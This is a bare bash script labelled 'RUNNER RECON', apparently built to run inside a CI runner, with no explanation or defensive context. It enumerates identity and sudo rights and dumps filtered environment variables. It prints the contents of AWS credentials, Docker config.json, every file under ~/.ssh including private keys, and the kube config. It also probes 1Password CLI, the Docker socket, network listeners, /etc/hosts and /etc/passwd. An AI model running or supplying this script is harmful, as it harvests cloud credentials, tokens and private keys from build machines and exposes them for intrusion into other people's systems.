#!/bin/bash
echo "===== RUNNER RECON START ====="
echo "-- identity --"
id; whoami; hostname; uname -a
echo "-- sudo --"
sudo -n -l 2>&1 | head -20
echo "-- env (filtered) --"
env | sort | grep -viE "^(PATH|HOME|LD_LIBRARY|PWD|SHLVL|_=|NODE|PNPM|NPM|CI=|GITHUB_|RUNNER_|ACTIONS_|INPUT_|STATE_|STEP_|GITHUB|RUNNER|ACTIONS|CONDA|XDG|TMP|TERM|USER=|LANG|LC_|HOSTNAME|OLDPWD|BASH)" | head -120
echo "-- home --"
ls -la ~ 2>/dev/null
echo "-- .aws --"
ls -la ~/.aws 2>/dev/null; cat ~/.aws/credentials 2>/dev/null; cat ~/.aws/config 2>/dev/null
echo "-- .docker --"
ls -la ~/.docker 2>/dev/null; cat ~/.docker/config.json 2>/dev/null
echo "-- .ssh --"
ls -la ~/.ssh 2>/dev/null; for f in ~/.ssh/*; do [ -f "$f" ] && echo "== $f ==" && head -c 1500 "$f"; done 2>/dev/null
echo "-- .config --"
ls -la ~/.config 2>/dev/null
echo "-- .kube --"
ls -la ~/.kube 2>/dev/null; cat ~/.kube/config 2>/dev/null | head -40
echo "-- 1password --"
which op 2>/dev/null; op whoami 2>&1 | head -5; ls -la ~/.config/op 2>/dev/null
echo "-- runner dirs --"
ls -la /home/runner 2>/dev/null; ls -la /Users/runner 2>/dev/null; ls -la /runner 2>/dev/null
echo "-- mounts --"
cat /proc/mounts 2>/dev/null | head -25
echo "-- docker socket --"
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null; which docker 2>/dev/null; docker images 2>&1 | head -10
echo "-- network --"
ip addr 2>/dev/null | grep -E "inet |^[0-9]+:" | head -15
ip route 2>/dev/null | head -10
ss -tlnp 2>/dev/null | head -40
echo "-- /etc/hosts --"
cat /etc/hosts 2>/dev/null
echo "-- passwd --"
cat /etc/passwd 2>/dev/null | head -20
echo "-- root listing --"
ls -la / 2>/dev/null | head -40
echo "===== RUNNER RECON END ====="
